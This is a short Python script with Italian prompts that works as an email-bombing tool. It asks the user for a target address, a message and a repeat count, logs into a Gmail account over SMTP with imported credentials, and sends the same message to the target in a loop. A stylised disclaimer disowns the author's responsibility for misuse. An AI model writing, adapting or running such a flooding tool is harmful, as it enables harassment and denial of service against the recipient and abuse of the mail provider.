import smtplib
from cred import *

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

print("n\n\n\n\n\n\n\n\n\n")
f = open('ascii.json', 'r')
file_contents = f.read()
print (bcolors.OKCYAN+file_contents+bcolors.ENDC)
f.close()

print(bcolors.WARNING+"\n\nš©šš ššŖš©šš¤š§ ššØšØšŖš¢ššØ š£š¤ š§ššØš„š¤š£šØšššš”šš©š® šš¤š§ šš¤š¬ š©šššØ šš¤š£š©šš£š© š¬šš”š” šš šŖšØšš\n=======================================================================\n\n"+bcolors.ENDC)

em_per_spam = em_spam
ps_email_per_spam = pass_em
em_da_spam = input("\nInserire email a cui si vuole spammare:  ")
cont_em = input("\nInserire il contenuto email da spammare:  ")
nume_spam = int(input("\nInserire il numero di quante volte si vuole inviare la email:  "))
contenuto = cont_em
mail = smtplib.SMTP('smtp.gmail.com', 587) # questa configurazione funziona per gmail
mail.ehlo() # protocollo per extended SMTP
mail.starttls() # email criptata
mail.login(em_spam, pass_em)

for i in range(nume_spam):
	mail.sendmail(em_per_spam, em_da_spam, contenuto)

print("\n\n" + bcolors.OKGREEN + str(nume_spam) + " emails have been sent" + bcolors.ENDC)


mail.close()
